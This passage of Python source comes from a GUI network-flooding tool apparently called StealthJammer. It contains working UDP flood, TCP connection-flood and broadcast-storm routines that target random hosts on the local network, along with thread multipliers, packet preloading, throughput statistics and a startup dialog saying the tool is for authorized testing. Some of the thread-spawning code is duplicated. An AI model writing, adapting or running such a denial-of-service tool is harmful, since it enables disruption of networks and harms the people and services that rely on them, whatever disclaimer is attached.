        self.attack_button.config(text="STOP ATTACK", bg=self.danger_color)
        self.status_label.config(text="ATTACKING", foreground=self.danger_color)
        
        self.log_message("Attack initiated", "ATTACK")
        self.log_message(f"Intensity level: {self.intensity}/10", "ATTACK")
        self.log_message(f"Packet size: {self.packet_size_min}-{self.packet_size_max} bytes", "ATTACK")
        self.log_message(f"Send rate: {self.send_rate} pps/thread", "ATTACK")
        self.log_message(f"Burst size: {self.burst_size} packets", "ATTACK")
        
        self.generate_spoofed_identifiers()
        
        # Preload packets if enabled and not already loaded
        if self.preload_enabled and len(self.preloaded_packets) == 0:
            self.log_message("Auto-preloading packets for attack...", "INFO")
            self._preload_packets_thread()
        
        # Use customizable thread multiplier
        num_threads = self.intensity * self.thread_multiplier
        
        active_vectors = []
        if self.vector_udp_var.get():
            active_vectors.append("UDP Flood")
            for _ in range(num_threads):
                t = threading.Thread(target=self.udp_flood_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        if self.vector_tcp_var.get():
            active_vectors.append("TCP SYN Flood")
            for _ in range(num_threads):
                t = threading.Thread(target=self.tcp_syn_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        if self.vector_broadcast_var.get():
            active_vectors.append("Broadcast Storm")
            for _ in range(num_threads):
                t = threading.Thread(target=self.broadcast_storm_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        self.log_message(f"Vectors: {', '.join(active_vectors)}", "ATTACK")
        self.log_message(f"Spawned {len(self.attack_threads)} attack threads", "ATTACK")
        self.log_message(f"Target throughput: {num_threads * self.send_rate:,} pps", "ATTACK")
        
        if self.vector_tcp_var.get():
            for _ in range(num_threads):
                t = threading.Thread(target=self.tcp_syn_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
        
        if self.vector_broadcast_var.get():
            for _ in range(num_threads):
                t = threading.Thread(target=self.broadcast_storm_attack, daemon=True)
                t.start()
                self.attack_threads.append(t)
    
    def stop_attack(self):
        """Stop the attack"""
        self.attack_active = False
        
        self.attack_button.config(text="START ATTACK", bg=self.success_color)
        self.status_label.config(text="Idle", foreground=self.warning_color)
        
        self.log_message("Attack stopped", "WARNING")
        self.log_message(f"Total packets sent: {self.packets_sent:,}", "INFO")
        self.log_message(f"Total data sent: {self.format_bytes(self.bytes_sent)}", "INFO")
        
        self.attack_threads = []
    
    def udp_flood_attack(self):
        """UDP flood with preloaded packets and customizable settings"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)  # 256KB send buffer
            
            # Calculate delay based on send rate
            delay_per_burst = self.burst_size / self.send_rate if self.send_rate > 0 else 0.001
            
            preload_index = 0
            
            while self.attack_active:
                try:
                    # Send burst of packets
                    for _ in range(self.burst_size):
                        if self.preload_enabled and len(self.preloaded_packets) > 0:
                            # Use preloaded packet
                            packet = self.preloaded_packets[preload_index % len(self.preloaded_packets)]
                            sock.sendto(packet['data'], (packet['target'], packet['port']))
                            size = packet['size']
                            preload_index += 1
                        else:
                            # Generate packet on the fly
                            port = random.randint(1, 65535)
                            size = random.randint(self.packet_size_min, self.packet_size_max)
                            target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                            
                            payload = bytes(random.getrandbits(8) for _ in range(size))
                            sock.sendto(payload, (target, port))
                        
                        self.packets_sent += 1
                        self.bytes_sent += size
                    
                    # Adaptive delay based on send rate
                    if delay_per_burst > 0:
                        time.sleep(delay_per_burst)
                except:
                    pass
            
            sock.close()
        except:
            pass
    
    def tcp_syn_attack(self):
        """TCP SYN flood with customizable send rate"""
        try:
            # Calculate delay based on send rate
            delay_per_burst = self.burst_size / self.send_rate if self.send_rate > 0 else 0.001
            
            while self.attack_active:
                try:
                    # Create bursts of connections
                    for _ in range(self.burst_size):
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.01)  # Very short timeout
                        
                        port = random.randint(1, 65535)
                        target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                        
                        try:
                            sock.connect((target, port))
                        except:
                            pass
                        
                        sock.close()
                        self.packets_sent += 1
                        self.bytes_sent += 60  # Approximate TCP SYN packet size
                    
                    # Adaptive delay
                    if delay_per_burst > 0:
                        time.sleep(delay_per_burst)
                except:
                    pass
        except:
            pass
    
    def broadcast_storm_attack(self):
        """Broadcast storm with preloaded packets and customizable settings"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)  # 256KB send buffer
            
            # Calculate delay based on send rate
            delay_per_burst = self.burst_size / self.send_rate if self.send_rate > 0 else 0.001
            
            preload_index = 0
            
            while self.attack_active:
                try:
                    # Send burst of broadcast packets
                    for _ in range(self.burst_size):
                        if self.preload_enabled and len(self.preloaded_packets) > 0:
                            # Use preloaded packet
                            packet = self.preloaded_packets[preload_index % len(self.preloaded_packets)]
                            sock.sendto(packet['data'], ("255.255.255.255", packet['port']))
                            size = packet['size']
                            preload_index += 1
                        else:
                            # Generate packet on the fly
                            size = random.randint(self.packet_size_min, self.packet_size_max)
                            payload = bytes(random.getrandbits(8) for _ in range(size))
                            port = random.randint(1, 65535)
                            sock.sendto(payload, ("255.255.255.255", port))
                        
                        self.packets_sent += 1
                        self.bytes_sent += size
                    
                    # Adaptive delay
                    if delay_per_burst > 0:
                        time.sleep(delay_per_burst)
                except:
                    pass
            
            sock.close()
        except:
            pass
    
    def update_stats(self):
        """Update statistics display"""
        if self.attack_active:
            # Calculate duration
            duration = int(time.time() - self.start_time)
            
            # Calculate rates
            current_time = time.time()
            time_diff = current_time - self.last_update_time
            
            if time_diff >= 1.0:  # Update rates every second
                packet_diff = self.packets_sent - self.last_packet_count
                byte_diff = self.bytes_sent - self.last_byte_count
                
                self.current_pps = int(packet_diff / time_diff)
                self.current_bandwidth = int(byte_diff / time_diff)
                
                self.last_packet_count = self.packets_sent
                self.last_byte_count = self.bytes_sent
                self.last_update_time = current_time
            
            # Update labels
            self.packets_label.config(text=f"{self.packets_sent:,}")
            self.time_label.config(text=f"{duration}s")
            self.rate_label.config(text=f"{self.current_pps:,} pps")
            self.bandwidth_label.config(text=f"{self.format_bytes(self.current_bandwidth)}/s")
            self.data_label.config(text=self.format_bytes(self.bytes_sent))
            self.threads_label.config(text=f"{len(self.attack_threads)}")
        
        # Update ping
        if self.current_ping >= 0:
            if self.current_ping == 0:
                self.ping_label.config(text="<1 ms", foreground=self.success_color)
            elif self.current_ping < 50:
                self.ping_label.config(text=f"{self.current_ping} ms", foreground=self.success_color)
            elif self.current_ping < 100:
                self.ping_label.config(text=f"{self.current_ping} ms", foreground=self.warning_color)
            else:
                self.ping_label.config(text=f"{self.current_ping} ms", foreground=self.danger_color)
        else:
            self.ping_label.config(text="Timeout", foreground=self.danger_color)
        
        # Schedule next update
        self.after(200, self.update_stats)  # Update every 200ms for smoother display
    
    def on_destroy(self):
        """Cleanup on exit"""
        self.attack_active = False
        self.ping_monitoring = False
        
        # Note: Windows MAC address restoration would require registry changes
        # which we're not implementing for safety reasons
        
        self.log_message("System shutdown initiated", "WARNING")
        self.destroy()

if __name__ == "__main__":
    # Show warning on startup
    root = tk.Tk()
    root.withdraw()
    
    response = messagebox.askyesno(
        "WARNING - Legal Notice",
        "This tool is designed for authorized security testing only.\n\n"
        "Unauthorized network attacks are ILLEGAL and may result in:\n"
        "• Criminal prosecution\n"
        "• Civil liability\n"
        "• Network disruption\n\n"
        "By clicking 'Yes', you confirm:\n"
        "1. You have explicit authorization to test this network\n"
        "2. You understand the legal implications\n"
        "3. You accept full responsibility for your actions\n\n"
        "Do you wish to continue?",
        icon='warning'
    )
    
    root.destroy()
    
    if response:
        app = StealthJammer()
        app.mainloop()
    else:
        sys.exit(0)
